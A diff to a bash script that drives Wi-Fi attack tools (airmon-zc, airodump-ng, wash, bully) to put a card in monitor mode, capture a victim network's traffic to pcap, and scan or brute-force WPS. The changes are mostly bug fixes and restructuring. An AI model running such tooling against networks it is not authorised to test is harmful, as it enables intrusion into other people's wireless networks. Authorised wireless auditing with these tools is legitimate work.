@@ -50,27 +50,30 @@ if [[ -n $(ip addr | grep -i "$MON") ]]; then echo "$WARN Leftover scoobie snack
 get_name "VICTIM_BSSID="; VICTIM_BSSID=$USE
 get_name "CHAN="; CHAN=$USE
 get_name "BSSID="; BSSID=$USE
-[[ -n $(rfkill list | grep yes) ]] && rfkill unblock 0
+[[ -n $(rfkill list | grep yes) ]] && rfkill unblock 0 || echo "You may need to run rfkill"
 
-doit()
+do_it()
 {
-    if [[ -z $(ip addr | grep -i "$MON") ]]; then 
+    if [[ -z $(ip addr | grep -i "$MON") ]]; then
         iwconfig $IFACE1 mode managed # Force managed mode upon wlan because airmon wont do this
         airmon-zc start $IFACE1
     fi
-    sleep 1
     if [[ $JOB == "recon" ]]; then
+        while [[ -z $(ip addr list | grep $MON) ]]; do
+            sleep 0.5
+        done
+        #/bin/sh -c "/usr/bin/launch '/usr/sbin/airmon-zc' 'start' 'wlan1mon' 'sudo -s'"
         xterm -hold -bg black -fg blue -T "Recon" -geometry 90x20 -e airodump-ng $MON &>/dev/null &
     elif [[ $JOB == "dump" ]]; then
         if [[ -f ${sessionfolder}/${VICTIM_BSSID}* ]]; then
             read -p "${VICTIM_BSSID}.cap exists already. Continuing will remove the file. Continue anyways? [y/n]" option
-            if [[ $option != [Yy] ]];
+            if [[ $option != [Yy] ]]; then
                 exit 1
             else
                 rm ${sessionfolder}/${VICTIM_BSSID}*
             fi
 	fi
-        xterm -hold -bg black -fg blue -T "Dump" -geometry 90x20 -e airodump-ng --bssid $VICTIM_BSSID -c $CHAN -w ${sessionfolder}/$VICTIM_BSSID $MON &>/dev/null &
+        xterm -hold -bg black -fg blue -T "Dump" -geometry 90x20 -e airodump-ng --bssid $VICTIM_BSSID -c $CHAN --output-format pcap -w ${sessionfolder}/$VICTIM_BSSID $MON &>/dev/null &
     elif [[ $JOB == "wash" ]]; then
         sudo wash -i $MON --ignore-fcs
     elif [[ $JOB == "bully" ]]; then
@@ -78,8 +81,10 @@ doit()
     else
       echo "error that can't happen happened"
     fi
+    keepalive
 }
 
+trap killAll INT HUP;
 keepalive()
 {
     read -p "$WARN Press ctrl^c when you are ready to go down!" ALLINTHEFAMILY # Protect this script from going down hastily
@@ -88,11 +93,9 @@ keepalive()
 
 killAll()
 {
-	airmon-zc stop $MON
-	echo "${BLD_TEA}$(cat ${DIR_LOGO}/die.logo)${TXT_RST}"
+    airmon-zc stop $MON
+    echo "${BLD_TEA}$(cat ${DIR_LOGO}/die.logo)${TXT_RST}"
     sleep 2
-	exit 0
+    exit 0
 }
-trap killAll INT HUP;
-doit
-keepalive
+do_it
